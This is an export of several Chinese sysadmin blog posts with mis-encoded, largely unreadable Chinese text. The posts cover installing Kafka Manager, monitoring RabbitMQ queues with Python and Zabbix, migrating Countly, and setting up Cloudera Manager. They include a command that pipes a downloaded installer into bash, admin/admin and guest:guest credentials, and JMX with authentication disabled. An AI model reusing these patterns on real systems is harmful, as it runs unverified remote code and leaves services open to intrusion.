å‚è€ƒå¼€æºåœ°å€ï¼šhttps://github.com/yahoo/kafka-manager RequirementsKafka 0.8.1.1 or 0.8.2. or 0.9.0. or 0.10.0.*Java 8+ 123456sudo wget --header \"Cookie: oraclelicense=accept-securebackup-cookieâ€ http://download.oracle.com/otn-pub/java/jdk/8u144-b01/090f390dda5b47b9b721c7dfaa008135/jdk-8u144-linux-x64.tar.gzsudo vim /etc/profileexport JAVA_HOME=/home/jollybi/tools/jdk1.8.0_144export LASSPATH=.:$JAVA_HOME/lib/tools.jar:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib:$JAVA_HOME/jre/lib:$JAVA_HOME/binexport PATH=$JAVA_HOME/bin:$JAVA_HOME/jre/bin:$TOMCAT_HOME/bin:$PATH Deployment1234567891011121314151617git clone https://github.com/yahoo/kafka-manager.git./sbt clean dist[info] Compilation completed in 13.366 smodel contains 672 documentable templates[info] Main Scala API documentation successful.[info] Packaging /home/jollybi/kafka-manager/target/scala-2.11/kafka-manager_2.11-1.3.3.8-javadoc.jar ...[info] Done packaging.[info] Packaging /home/jollybi/kafka-manager/target/scala-2.11/kafka-manager_2.11-1.3.3.8.jar ...[info] Done packaging.[info] Packaging /home/jollybi/kafka-manager/target/scala-2.11/kafka-manager_2.11-1.3.3.8-sans-externalized.jar ...[info] Done packaging.[info][info] Your package is ready in /home/jollybi/kafka-manager/target/universal/kafka-manager-1.3.3.8.zip[info][success] Total time: 142 s, completed Jul 27, 2017 3:48:35 PMå®Œæˆ Starting the service12345678910111213141516171819202122232425262728293031è§£å‹ç¼©ç”Ÿæˆçš„zipæ–‡ä»¶åï¼Œå°†å·¥ä½œç›®å½•æ›´æ”¹ä¸ºå¯ä»¥è¿è¡Œçš„æœåŠ¡ï¼šunzip /home/jollybi/kafka-manager/target/universal/kafka-manager-1.3.3.8.zipä¿®æ”¹zkåœ°å€å’Œç®¡ç†å‘˜è´¦å·å’Œå¯†ç ï¼švim kafka-manager-1.3.3.8/conf/application.conf#kafka-manager.zkhosts=\"kafka-manager-zookeeper:2181\"#zké›†ç¾¤å¯ä»¥è¿™ä¹ˆé…ç½®ï¼škafka-manager.zkhosts=\"kafka1.jollychic.com:2281,kafka2.jollychic.com:2281,kafka3.jollychic.com:2281\"#æ ¹æ®ä¸ªäººå…¬å¸è¿™é‡Œå¯ä»¥å¼€å¯true è®¾ç½®è´¦å·å’Œå¯†ç basicAuthentication.enabled=truebasicAuthentication.username=\"admin\"basicAuthentication.password=\"admin\"é»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒå°†é€‰æ‹©ç«¯å£9000.è¿™æ˜¯å¯ä»¥è¦†ç›–çš„ï¼Œé…ç½®æ–‡ä»¶çš„ä½ç½®ä¹Ÿæ˜¯å¦‚æ­¤ã€‚ä¾‹å¦‚ï¼š$ ./bin/kafka-manager -Dconfig.file=conf/application.conf -Dhttp.port=8080åå°ç”Ÿæ•ˆï¼š$ ./bin/kafka-manager -Dconfig.file=conf/application.conf -Dhttp.port=8080 &amp;å†æ¬¡ï¼Œå¦‚æœjavaä¸åœ¨æ‚¨çš„è·¯å¾„ä¸­ï¼Œæˆ–è€…æ‚¨éœ€è¦é’ˆå¯¹ä¸åŒç‰ˆæœ¬çš„Javaè¿è¡Œï¼Œè¯·æŒ‰å¦‚ä¸‹æ‰€ç¤ºæ·»åŠ -java-homeé€‰é¡¹ï¼š$ bin/kafka-manager -java-home /usr/local/oracle-java-8 Packaging12345If you'd like to create a Debian or RPM package instead, you can run one of:sbt debian:packageBinsbt rpm:packageBin æŸ¥çœ‹ç«¯å£ï¼š12345[jollybi@kafka1 conf]$ netstat -ntulp | grep 8080(Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.)tcp6 0 0 :::8080 :::* LISTEN 70517/java å››ã€å®‰è£…é…ç½®ä¸­çš„ä¸¤ä¸ªå°å‘ 1234567891011121314151617181ã€å®‰è£…é…ç½®ä¸Šé¢å·²ç»æœ‰è¯´æ˜ä»‹ç»æ­¥éª¤ã€‚2ã€kafkaçš„æœåŠ¡å™¨å¿…é¡»æ·»åŠ hostnameå¯¹åº”çš„hoståŸŸåè§£æï¼Œå¹¶é‡å¯kafkaè¿™ä¸ªæ˜¯javaæœ¬èº«å¤„ç†çš„ä¸€ä¸ªæœºåˆ¶é—®é¢˜ï¼Œé€šè¿‡ä»£ç ä¿®æ”¹å’Œç»‘å®šhostéƒ½å¯ä»¥è§£å†³ï¼Œå¦‚æœä¸å¤„ç†ï¼ŒæŠ¥å‡ºæ¥çš„é”™è¯¯å¦‚ä¸‹ï¼šat org.apache.kafka.clients.consumer.KafkaConsumer.pollOnce(KafkaConsumer.java:974) ~[org.apache.kafka.kafka-clients-0.10.0.1.jar:na][error] k.m.j.KafkaJMX$ - Failed to connect to service:jmx:rmi:///jndi/rmi://10.143.40.239:9999/jmxrmijava.rmi.ConnectException: Connection refused to host: 127.0.0.1; nested exception is: java.net.ConnectException: Connection refusedä»ä¸€ä¸ªè¿ç»´äººå‘˜çš„è§’åº¦å‡ºå‘ï¼Œæ”¹hostè§£ææ˜¯æœ€å¾—å¿ƒåº”æ‰‹çš„ï¼Œç™»å½•kafkaçš„æœåŠ¡å™¨ï¼Œæ‰“å¼€/etc/hostsæ–‡ä»¶ï¼Œå°†ä¸»æœºåå¯¹åº”çš„è§£æè®°å½•ä¿®æ”¹ä¸ºæœ¬æœºå¯¹å¤–é€šä¿¡çš„ipåœ°å€ï¼Œå¦å¤–å°†127.0.0.1å’Œ::1å¯¹åº”çš„ä¸»æœºååˆ æ‰ï¼Œä¿®æ”¹å¦‚ä¸‹ï¼Œä¿®æ”¹åå¿…é¡»é‡å¯kafkaæ‰èƒ½ç”Ÿæ•ˆã€‚127.0.0.1 localhost.localdomain localhost169.44.62.19 kafka1.jollychic.com kafka1169.44.59.18 kafka2.jollychic.com kafka2169.44.62.17 kafka3.jollychic.com kafka3169.55.32.22 kafka4.jollychic.com kafka410.155.90.13 zk1.jollychic.com10.155.90.15 zk2.jollychic.com10.155.90.18 zk3.jollychic.com ç½‘ç«™è®¿é—®kafka Mangerè¿™é‡Œæˆ‘è®¾ç½®äº†ç™»å½•è´¦å·å’Œå¯†ç ï¼š admin admin åˆ›å»ºkafkaåå­—;é€‰æ‹©kafkaç‰ˆæœ¬å·;JMXè¿™ä¸ªä¸éœ€è¦;ä¸‹é¢é€‰æ‹©é»˜è®¤ç‚¹å‡»ç¡®è®¤å³å¯. (2)kafka å¯ç”¨ JMXç«¯å£ 1234567891011121314ä»¥å¦‚ä¸‹å‘½ä»¤é‡æ–°å¯åŠ¨kafkaJMX_PORT=9999 bin/kafka-server-start.sh config/server.propertiesæˆ–è€…ä¿®æ”¹kafka-server-start.sh æ–‡ä»¶ï¼Œè¿½åŠ JMX_PORT=\"9999\" if [ \"x$KAFKA_HEAP_OPTS\" = \"x\" ]; then export KAFKA_HEAP_OPTS=\"-Xmx1G -Xms1G\" export JMX_PORT=\"9999\"fiç„¶åé‡æ–°å¯åŠ¨kafkabin/kafka-server-start.sh config/server.propertiesä½†æ˜¯Metricsä¸­æ•°æ®éƒ½æ˜¯é›¶æŸ¥çœ‹ kafka manager æŠ¥é”™ï¼Œæ— æ³•è¿æ¥jxm 1234567891011è§£å†³æ–¹æ³• ä¿®æ”¹æ¯ä¸ªkafka brokerçš„ kafka_2.11-0.10.1.0/bin/kafka-run-class.shæ–‡ä»¶â€‹# JMX settingsif [ -z \"$KAFKA_JMX_OPTS\" ]; then KAFKA_JMX_OPTS=\"-Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false -Djava.rmi.server.hostname=75.126.5.162\"fi-Djava.rmi.server.hostname çš„å€¼ä¸ºå½“å‰kafkaæœåŠ¡å™¨ipè¿™é‡Œè¯´æ˜ä¸‹é›†ç¾¤kafkaéƒ½éœ€è¦ä¿®æ”¹ äº¤æµå­¦ä¹ ï¼šğŸ§ Linux shell_é«˜çº§è¿ç»´æ´¾: 459096184 åœˆå­ (ç³»ç»Ÿè¿ç»´-åº”ç”¨è¿ç»´-è‡ªåŠ¨åŒ–è¿ç»´-è™šæ‹ŸåŒ–æŠ€æœ¯ç ”ç©¶æ¬¢è¿åŠ å…¥)ğŸ§ BigData-Exchange School : 521621407 åœˆå­ï¼ˆå¤§æ•°æ®è¿ç»´)ï¼ˆHadoopå¼€å‘äººå‘˜)ï¼ˆå¤§æ•°æ®ç ”ç©¶çˆ±å¥½è€…) æ¬¢è¿åŠ å…¥ ç›¸åº”Bidataæœ‰å†…éƒ¨å¾®ä¿¡äº¤æµç¾¤äº’ç›¸å­¦ä¹ ï¼ŒåŠ å…¥QQç¾¤æœ‰é“¾æ¥ã€‚","link":"/2017/05/28/Bigdata-hadoop/Kafka/å¼€æºçš„Kafkaé›†ç¾¤ç®¡ç†å™¨(Kafka Manager)/"},{"title":"Zabbix 3.0 ç›‘æ§æ¨é€rabbitmqé˜Ÿåˆ—-æ¶ˆæ¯å †ç§¯","text":"Zabbix 3.0 ç›‘æ§æ¨é€rabbitmqé˜Ÿåˆ—å¯¹äºRabbitMQçš„ç›‘æ§ï¼Œé™¤äº†æœåŠ¡å™¨åŸºæœ¬ä¿¡æ¯ï¼ˆç¡¬ç›˜ã€CPUã€å†…å­˜ã€IOç­‰ï¼‰ä»¥åŠMQçš„è¿›ç¨‹å’Œç«¯å£ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡è¯·æ±‚urlè®¿é—®ç®¡ç†APIç›‘æ§å…¶é›†ç¾¤å’Œé˜Ÿåˆ—çš„æƒ…å†µã€‚åœ¨java api 3.6.0ä»¥åï¼Œchannelæ¥å£ä¸ºæˆ‘ä»¬æä¾›äº†å¦‚ä¸‹æ¥å£ï¼š messageCountï¼šæŸ¥è¯¢é˜Ÿåˆ—æœªæ¶ˆè´¹çš„æ¶ˆæ¯æ•°ï¼Œå¯ä»¥ç›‘æ§æ¶ˆæ¯å †ç§¯çš„æƒ…å†µã€‚ consumerCountï¼šé˜Ÿåˆ—çš„æ¶ˆè´¹è€…ä¸ªæ•°ï¼Œå¯ä»¥å¯¹æ¶ˆè´¹è€…è¿›è¡Œç›‘æ§ 1.ç›‘æ§å‘Šè­¦éœ€æ±‚é—®é¢˜ï¼š 1234message.bié˜Ÿåˆ— ç§¯å‹&gt; 300 æˆ–è€… æ¶ˆè´¹è€…æ•°&lt;=2message.push.carté˜Ÿåˆ— ç§¯å‹ &gt;10000 æˆ–è€…æ¶ˆè´¹è€…æ•°&lt;5message.user.relatedé˜Ÿåˆ— ç§¯å‹&gt;2000 æˆ–è€… æ¶ˆè´¹è€…æ•°&lt;=2message.carté˜Ÿåˆ— ç§¯å‹&gt;10000 æˆ–è€… æ¶ˆè´¹è€…æ•°&lt;=2 2.ç¼–å†™Pythonè„šæœ¬ç›‘æ§è·å–æ¶ˆè´¹è€…æ•°ç›‘æ§ï¼Œé˜Ÿåˆ—ã€‚ 12345678910111213141516171819202122vim rabbitmq-monitor.py#!/bin/env python# -*- coding: UTF-8 -*-import sys, urllib2, base64, json, re,timeip = \"169.23.73.22\"keys = ('messages_ready',)def GetRabbitmqData(): request = urllib2.Request(\"http://%s:15672/api/queues\" % ip) base64string = base64.b64encode('guest:guest') request.add_header(\"Authorization\", \"Basic %s\" % base64string) result = urllib2.urlopen(request) data = json.loads(result.read()) return datadata=GetRabbitmqData()#print datafor queue in data: try: print \"æ¶ˆè´¹è€…æ•°é‡:\",queue['consumers'],\"é˜Ÿåˆ—:\",queue['name'],\"æ¶ˆæ¯ç§¯å‹æ•°:\",int(queue[keys[0]]) except: pass 12345678910111213141516171819[root@message-center-mq zabbix]# python rabbitmq-monitor.pyæ¶ˆè´¹è€…æ•°é‡: 0 é˜Ÿåˆ—: 79d02dde-2007-4a49-b94b-0d4bee67b19c æ¶ˆæ¯ç§¯å‹æ•°: 0æ¶ˆè´¹è€…æ•°é‡: 0 é˜Ÿåˆ—: aliveness-test æ¶ˆæ¯ç§¯å‹æ•°: 0æ¶ˆè´¹è€…æ•°é‡: 0 é˜Ÿåˆ—: cartService.orderCancel.update æ¶ˆæ¯ç§¯å‹æ•°: 0æ¶ˆè´¹è€…æ•°é‡: 0 é˜Ÿåˆ—: cartService.virtualOrderCancel.update æ¶ˆæ¯ç§¯å‹æ•°: 0æ¶ˆè´¹è€…æ•°é‡: 0 é˜Ÿåˆ—: e9de65bd-be59-4c1c-b4a8-7312f382ac59 æ¶ˆæ¯ç§¯å‹æ•°: 0æ¶ˆè´¹è€…æ•°é‡: 3 é˜Ÿåˆ—: message.bi æ¶ˆæ¯ç§¯å‹æ•°: 0æ¶ˆè´¹è€…æ•°é‡: 3 é˜Ÿåˆ—: message.cart æ¶ˆæ¯ç§¯å‹æ•°: 0æ¶ˆè´¹è€…æ•°é‡: 3 é˜Ÿåˆ—: message.console æ¶ˆæ¯ç§¯å‹æ•°: 0æ¶ˆè´¹è€…æ•°é‡: 3 é˜Ÿåˆ—: message.logistics æ¶ˆæ¯ç§¯å‹æ•°: 0æ¶ˆè´¹è€…æ•°é‡: 3 é˜Ÿåˆ—: message.order.info æ¶ˆæ¯ç§¯å‹æ•°: 0æ¶ˆè´¹è€…æ•°é‡: 30 é˜Ÿåˆ—: message.push.cart æ¶ˆæ¯ç§¯å‹æ•°: 0æ¶ˆè´¹è€…æ•°é‡: 3 é˜Ÿåˆ—: message.style æ¶ˆæ¯ç§¯å‹æ•°: 0æ¶ˆè´¹è€…æ•°é‡: 3 é˜Ÿåˆ—: message.user.related æ¶ˆæ¯ç§¯å‹æ•°: 0æ¶ˆè´¹è€…æ•°é‡: 0 é˜Ÿåˆ—: payment.virtual.notify.success æ¶ˆæ¯ç§¯å‹æ•°: 0æ¶ˆè´¹è€…æ•°é‡: 1 é˜Ÿåˆ—: 61b73745-4c74-475b-803e-bf2d48d2fa50 æ¶ˆæ¯ç§¯å‹æ•°: 0æ¶ˆè´¹è€…æ•°é‡: 1 é˜Ÿåˆ—: a984d00a-8bbe-43c1-aa20-c1dc788ddd97 æ¶ˆæ¯ç§¯å‹æ•°: 0æ¶ˆè´¹è€…æ•°é‡: 1 é˜Ÿåˆ—: e569e8a1-b7c9-4736-8bf8-13d76ecf7577 æ¶ˆæ¯ç§¯å‹æ•°: 0æ¶ˆè´¹è€…æ•°é‡: 3 é˜Ÿåˆ—: push.station.task.status æ¶ˆæ¯ç§¯å‹æ•°: 0 ç¼–å†™zabbix-agentd ç›‘æ§ï¼š 123456789[root@message-center-mq zabbix]# vim zabbix_agentd.confUserParameter=rabbitmq.consumer.bi,python /etc/zabbix/rabbitmq-monitor.py | grep message.bi |awk -F'[ :]' '&#123;print $3&#125;'UserParameter=rabbitmq.overstock.bi,python /etc/zabbix/rabbitmq-monitor.py | grep message.bi |awk -F'[ :]' '&#123;print $NF&#125;'UserParameter=rabbitmq.consumer.push.cart,python /etc/zabbix/rabbitmq-monitor.py | grep message.push.cart |awk -F'[ :]' '&#123;print $3&#125;'UserParameter=rabbitmq.overstock.push.cart,python /etc/zabbix/rabbitmq-monitor.py | grep message.push.cart |awk -F'[ :]' '&#123;print $NF&#125;'UserParameter=rabbitmq.consumer.user.related,python /etc/zabbix/rabbitmq-monitor.py | grep message.user.related |awk -F'[ :]' '&#123;print $3&#125;'UserParameter=rabbitmq.overstock.user.related,python /etc/zabbix/rabbitmq-monitor.py | grep message.user.related |awk -F'[ :]' '&#123;print $NF&#125;'UserParameter=rabbitmq.consumer.cart,python /etc/zabbix/rabbitmq-monitor.py | grep message.cart |awk -F'[ :]' '&#123;print $3&#125;'UserParameter=rabbitmq.overstock.cart,python /etc/zabbix/rabbitmq-monitor.py | grep message.cart |awk -F'[ :]' '&#123;print $NF&#125;' ç›‘æ§æ¨¡æ¿ä¸‹è½½ï¼šåœ¨æˆ‘githubä¸Šé¢. weixinç›‘æ§æ•ˆæœå›¾ï¼š","link":"/2017/07/29/Bigdata-hadoop/RabbitMQ/Zabbix 3.0 ç›‘æ§æ¨é€rabbitmqé˜Ÿåˆ—/"},{"title":"Bigdata-countlyéœ€è¦è¿ç§»","text":"Countly æ­å»º1234567wget https://github.com/Countly/countly-server/releases/download/v17.05.1/countly-community-edition-v17.05.1.tar.gztar -zxvf countly-community-edition-v17.05.1.tar.gzsudo su - cd COUNTLY_INSTALLATION_DIRECTORY/binbash countly.install.shç¦ç”¨SELinux å®˜æ–¹å®‰è£…æ–‡æ¡£ï¼šCountly installç›®å‰countlyéœ€è¦è¿ç§»ï¼Œæ‰€éœ€countlyç‰ˆæœ¬äºå®˜æ–¹æä¾›çš„å®‰è£…æ–¹æ¡ˆæœ‰å†²çªï¼Œå®‰è£…å®˜æ–¹countlyè®©å…¶è®¾ç½®æ‰€éœ€ç¯å¢ƒå˜é‡åŠå…¶å¯åŠ¨è„šæœ¬ï¼Œæ‰‹åŠ¨æŒ‡å®šå®‰è£…nojsç‰ˆæœ¬ï¼Œæ‹·è´åŸcountlyæ–‡ä»¶ï¼Œå…·ä½“å¦‚ä¸‹ï¼š 123456789101112131415161718192021221ã€cd /data #countlyå®‰è£…åœ¨dataç›®å½• æˆ‘çœ‹äº†å®‰è£…è„šæœ¬ï¼Œæ˜¯å½“å‰åœ¨å“ªä¸ªç›®å½•ï¼Œå®‰è£…æ–‡ä»¶å°±åœ¨å“ªä¸ªç›®å½•wget -qO- http://c.ly/install | bash 2ã€rpm -qa | grep -i nodejs | xargs -I&#123;&#125; yum remove &#123;&#125; -yå¸è½½æ‰å®˜ç½‘å®‰è£…çš„æœ€æ–°nodejs ç„¶åæ–°å»ºå¦‚ä¸‹yumæºï¼Œç”¨äºå®‰è£…æ—§ç‰ˆæ‰€éœ€nodejsï¼Œä¹Ÿå¯ä»¥åˆ°nodejså®˜ç½‘ä¸‹è½½æ‰€éœ€nodejscat /etc/yum.repos.d/nodesource-el.repo [nodesource]name=Node.js Packages for Enterprise Linux 7 - $basearchbaseurl=https://rpm.nodesource.com/pub_5.x/el/7/$basearchfailovermethod=priorityenabled=1gpgcheck=1gpgkey=file:///etc/pki/rpm-gpg/NODESOURCE-GPG-SIGNING-KEY-EL[nodesource-source]name=Node.js for Enterprise Linux 7 - $basearch - Sourcebaseurl=https://rpm.nodesource.com/pub_5.x/el/7/SRPMSfailovermethod=priorityenabled=0gpgkey=file:///etc/pki/rpm-gpg/NODESOURCE-GPG-SIGNING-KEY-ELgpgcheck=1 å®‰è£…è€ç‰ˆæœ¬æ‰€éœ€nodejs1yum install nodejs 1233ã€æ‹·è´æºcountlyæ–‡ä»¶åˆ°/data/countlyç›®å½•ä¿®æ”¹ /data/countly/api/config.js å’Œ /data/countly/frontend/express/config.js 3001ç«¯å£å’Œ 6001ç«¯å£ç›‘å¬åœ°å€æ¢æˆ æœ¬åœ°ç§æœ‰åœ°å€ #æºæ–‡ä»¶æ˜¯ç›‘å¬çš„åŸæ¥æœºå™¨çš„å†…ç½‘åœ°å€ï¼Œä¸ä¿®æ”¹çš„è¯ï¼ŒæœåŠ¡å¯åŠ¨ä¸äº†ã€‚ 123456789101112131415161718192021224ã€æ‹·è´mongoæ•°æ®ç›®å½•åˆ°/data/mongoç›®å½•ï¼Œä¿®æ”¹mongoé…ç½®æ–‡ä»¶.cat /etc/mongod.confsystemLog: destination: file logAppend: true path: /data/mongodb/mongod.logstorage: dbPath: /data/mongo journal: enabled: true engine: mmapv1processManagement: fork: true pidFilePath: /data/mongodb/mongod.pidnet: port: 27017 bindIp: 127.0.0.1security: authorization: enabledoperationProfiling: slowOpThresholdMs: 40960 125ã€ä¿®æ”¹ç¡¬ç›˜blockï¼š blockdev --setra 256 /dev/mapper/xvdc--vg-xvdcâ€“lv ##æŒ‰ç…§mongoæç¤ºæ“ä½œ 126ã€ä¿®æ”¹nginxé…ç½®æ–‡ä»¶ conf.d/default.conf å°†127.0.0.1ä¿®æ”¹ä¸ºæœ¬åœ°ç§æœ‰åœ°å€ 123456787ã€é‡å¯countly mongodb nginxcountly restart/etc/init.d/mongod restartservice nginx restartè¿ç§»å®Œæ¯• äº¤æµå­¦ä¹ ï¼šğŸ§ Linux shell_é«˜çº§è¿ç»´æ´¾: 459096184 åœˆå­ (ç³»ç»Ÿè¿ç»´-åº”ç”¨è¿ç»´-è‡ªåŠ¨åŒ–è¿ç»´-è™šæ‹ŸåŒ–æŠ€æœ¯ç ”ç©¶æ¬¢è¿åŠ å…¥)ğŸ§ BigData-Exchange School : 521621407 åœˆå­ï¼ˆå¤§æ•°æ®è¿ç»´)ï¼ˆHadoopå¼€å‘äººå‘˜)ï¼ˆå¤§æ•°æ®ç ”ç©¶çˆ±å¥½è€…) æ¬¢è¿åŠ å…¥ ç›¸åº”Bidataæœ‰å†…éƒ¨å¾®ä¿¡äº¤æµç¾¤äº’ç›¸å­¦ä¹ ï¼ŒåŠ å…¥QQç¾¤æœ‰é“¾æ¥ã€‚","link":"/2017/03/29/Bigdata-hadoop/countly/Bigdata-countlyæ­å»ºä¸è¿ç§»æ–¹æ¡ˆ/"},{"title":"Bigdata-Cloudera Manager5åŠCDH5å®‰è£…æŒ‡å¯¼","text":"é—®é¢˜å¯¼è¯»ï¼š1.ä»€ä¹ˆæ˜¯cloudera CM ã€CDH?2.CDHã€CMæœ‰å“ªäº›ç‰ˆæœ¬ï¼Ÿ3.CDHã€CMæœ‰å“ªäº›å®‰è£…æ–¹å¼ï¼Ÿ4.CDHå¦‚ä½•å¼€å‘ï¼Ÿ ä»€ä¹ˆæ˜¯CDHhadoopæ˜¯ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼Œæ‰€ä»¥å¾ˆå¤šå…¬å¸åœ¨è¿™ä¸ªåŸºç¡€è¿›è¡Œå•†ä¸šåŒ–ï¼ŒClouderaå¯¹hadoopåšäº†ç›¸åº”çš„æ”¹å˜ã€‚Clouderaå…¬å¸çš„å‘è¡Œç‰ˆï¼Œæˆ‘ä»¬å°†è¯¥ç‰ˆæœ¬ç§°ä¸ºCDHã€‚ å¾ˆå¤šæ–°æ‰‹é—®çš„æœ€å¤šçš„é—®é¢˜æ˜¯ï¼Œå“ªä¸ªæ˜¯æ”¶è´¹çš„ï¼Œé‚£ä¸ªæ˜¯å…è´¹çš„ã€‚Cloudera Expressç‰ˆæœ¬æ˜¯å…è´¹çš„Cloudera Enterpriseæ˜¯éœ€è¦è´­ä¹°æ³¨å†Œç çš„ æ›´å¤šå†…å®¹ï¼šCloudera Hadoopä»€ä¹ˆæ˜¯CDHåŠCDHç‰ˆæœ¬ä»‹ç» :http://www.aboutyun.com/thread-6788-1-1.html CDHï¼ˆClouderaï¼‰ä¸hadoopï¼ˆapacheï¼‰å¯¹æ¯” : http://www.aboutyun.com/thread-9225-1-1.html å¤§æ•°æ®æ¶æ„å¸ˆåŸºç¡€ï¼šhadoopå®¶æ—ï¼ŒClouderaäº§å“ç³»åˆ—ç­‰å„ç§æŠ€æœ¯ : http://www.aboutyun.com/thread-6842-1-1.html å®˜ç½‘ä»‹ç» ä¸»é¡µï¼šhttps://www.cloudera.com/downloads/manager/5-12-0.html CM(Cloudera Manager)æœ‰ä¸‰ç§å®‰è£…æ–¹å¼ï¼š1.ç¬¬ä¸€ç§ä½¿ç”¨cloudera-manager-installer.binå®‰è£… è¿™ç§å®‰è£…æ–¹å¼ï¼Œåªè¦ä»å®˜ç½‘ä¸‹è½½cloudera-manager-installer.bin ç„¶åæ‰§è¡Œè¿™ä¸ªbinæ–‡ä»¶ï¼Œå‰©ä¸‹çš„å°±æ˜¯ç­‰å¾…ä¸‹è½½å’Œå®‰è£…ã€‚ä½†æ˜¯è¿™ä¸ªæ—¶é—´ä¸æ˜¯ä¸€èˆ¬çš„é•¿ï¼Œæœ€å¥½åƒä¸ªé¥­ï¼Œç¡ä¸ªè§‰ï¼Œæœ€åçœ‹åˆ°è¿˜åœ¨å®‰è£…è¿‡ç¨‹ä¸­ã€‚æ­¤å¸–å®‰è£…æ­¥éª¤åŠé‡åˆ°é—®é¢˜è®°å½•å¾ˆè¯¦ç»†ï¼Œå¯å‚è€ƒCloudera Manager5åŠCDH5åœ¨çº¿ï¼ˆcloudera-manager-installer.binï¼‰å®‰è£…è¯¦ç»†æ–‡æ¡£Cloudera Manager5åŠCDH5å®‰è£…æŒ‡å¯¼ï¼ˆç»ˆæåœ¨çº¿å®‰è£…ï¼‰ é—®é¢˜å¯¼è¯»ï¼š1.Cloudera Manager5å®‰è£…éœ€è¦å“ªäº›ç¯å¢ƒè¦æ±‚ï¼Ÿ2.å“ªäº›Linuxç³»ç»Ÿä¸Šï¼Œå¯ä»¥å®‰è£…Cloudera Manager5ï¼Ÿ3.åœ¨å®‰è£…cdhçš„è¿‡ç¨‹ä¸­ï¼Œè¯¥å¦‚ä½•é€‰æ‹©ç‰ˆæœ¬ï¼Ÿ å®‰è£…ç¯å¢ƒè¦æ±‚ 1234567891011121314151617181920212223242526272829303132é›†ç¾¤ä¸­çš„å››å°ä¸»æœºå¿…é¡»æ»¡è¶³ä»¥ä¸‹è¦æ±‚ï¼šä¸»æœºå¿…é¡»è‡³å°‘æœ‰16 GBçš„RAMå¯¹äºRAMï¼Œæˆ‘ä»¬æˆ–è®¸æ²¡æœ‰å¤ªå¤šçš„æ¦‚å¿µï¼Œä¸‹é¢å¯ä»¥å‚è€ƒRAMå®¹é‡æ˜¯è¿è¡Œä¸­çš„ç¨‹åºæ‰€å ç”¨çš„ç©ºé—´ï¼Œä»–è¿è¡Œéœ€è¦çš„ç©ºé—´ã€ROMå®¹é‡æ˜¯ä½ çš„ç³»ç»Ÿå¯ä»¥å­˜æ”¾ï¼Œå ç”¨çš„ç©ºé—´ï¼Œä½ çš„æ‰€æœ‰ç³»ç»Ÿæ–‡ä»¶ï¼Œç¨‹åºéƒ½åœ¨è¿™é‡Œå­˜æ”¾ã€‚å¿…é¡»ä½¿ç”¨rootç”¨æˆ·ï¼Œæˆ–åˆ™ä½¿ç”¨sudoæ— å¯†ç è®¿é—®ï¼ˆä¹Ÿå°±æ˜¯è¯´å½“ä½ ä½¿ç”¨å…¶å®ƒç”¨æˆ·ï¼Œä½¿ç”¨sudoçš„æ—¶å€™ï¼Œä¸èƒ½è¾“å…¥å¯†ç ï¼‰å¦‚æœä½¿ç”¨rootç”¨æˆ·ï¼Œå¿…é¡»ä½¿ç”¨ç›¸åŒçš„å¯†ç ä¸»æœºå¿…é¡»èƒ½ä¸Šç½‘ï¼Œå…è®¸å®‰è£…å‘å¯¼è®¿é—®cdm.jollychic.comå¯ä»¥ä»ä¸‹é¢é€‰æ‹©ä¸€ä¸ªç³»ç»ŸRHEL-å…¼å®¹ç³»ç»ŸRed Hat Enterprise Linux and CentOS 5, 64-bitRed Hat Enterprise Linux and CentOS 6, 64-bitRed Hat Enterprise Linux and CentOS 7 in SE Linux ModeSLES - SUSE Linux Enterprise Server 11, 64-bit. Service Pack 2æˆ–åˆ™æ›´é«˜ç‰ˆæœ¬. æ›´æ–°å­˜å‚¨åº“å¿…é¡»æ˜¯æ¿€æ´»çš„å’Œ SUSE Linux Enterprise è½¯ä»¶å¼€å‘åŒ…11 SP1 .Debian - Debian 7.0 and 7.1, 64-bitUbuntu - Ubuntu 12.04, 64-bitå¦‚æœè¦æ±‚ä¸èƒ½ä¸Šé¢æ»¡è¶³ï¼Œå®‰è£…ä¼šä¸æˆåŠŸã€‚å…³äºCloudera Managerå®‰è£…é€‰é¡¹å’Œå®‰è£…è¦æ±‚çš„è¯¦ç»†ä¿¡æ¯å¯ä»¥æŸ¥çœ‹Cloudera Managerå®‰è£…å‘å¯¼ï¼ˆè‹±æ–‡ç‰ˆï¼‰è¡¥å……å’Œå¼ºè°ƒä¸€äº›å†…å®¹1.å…³é—­é˜²ç«å¢™2.é…ç½®hostï¼Œå¦‚ä¸‹å½¢å¼3.swapoff -a å…³é—­swapåˆ†åŒºæ·»åŠ å¼€æœºå¯åŠ¨ç”Ÿæ•ˆï¼šecho never &gt; /sys/kernel/mm/transparent_hugepage/defragecho never &gt; /sys/kernel/mm/transparent_hugepage/enabled ç¯å¢ƒï¼š123456ç³»ç»Ÿï¼š CentOS Linux release 7.3.1611 (Core) 2å°Namenode10å°DataNode1å°cdm å®‰è£…Cloudera Manager1å°gateway å®‰è£…æ­¥éª¤ï¼š å‡†å¤‡å·¥ä½œ 1234567891011121314151617181920212223242526é…ç½®hosts14å°æœåŠ¡å™¨éœ€è¦é…ç½®hostnameåŠhostså¦‚ä¸‹ï¼ˆè¿™é‡Œä¸€å®šè¦é…ç½®æ­£ç¡®å¦åˆ™ï¼Œä¼šé¢ä¼šå‡ºé€šä¿¡é—®é¢˜ï¼‰vim /etc/hosts127.0.0.1 localhost.localdomain localhost10.155.90.132 cdm cdm.jollychic.com10.155.90.134 gateway gateway.jollychic.com10.155.90.165 namenode1 namenode1.jollychic.com10.155.90.146 namenode2 namenode2.jollychic.com10.155.90.177 datanode1 datanode1.jollychic.com10.155.90.184 datanode2 datanode2.jollychic.com10.155.90.166 datanode3 datanode3.jollychic.com10.155.90.188 datanode4 datanode4.jollychic.com10.155.90.156 datanode5 datanode5.jollychic.com10.155.90.172 datanode6 datanode6.jollychic.com10.155.90.182 datanode7 datanode7.jollychic.com10.155.90.142 datanode8 datanode8.jollychic.com10.155.90.151 datanode9 datanode9.jollychic.com10.155.90.159 datanode10 datanode10.jollychic.comå…³é—­SELinux[root@cdm ~]# setenforce 0[root@cdm ~]# getenforceDisabled ä¸‹è½½å®‰è£…ï¼š 12345678910111213141516171819202122232425å•å‡»ä¸‹è½½ Cloudera Express æˆ–åˆ™ Download Cloudera Enterprise. æŸ¥çœ‹ Cloudera Express and Cloudera Enterprise 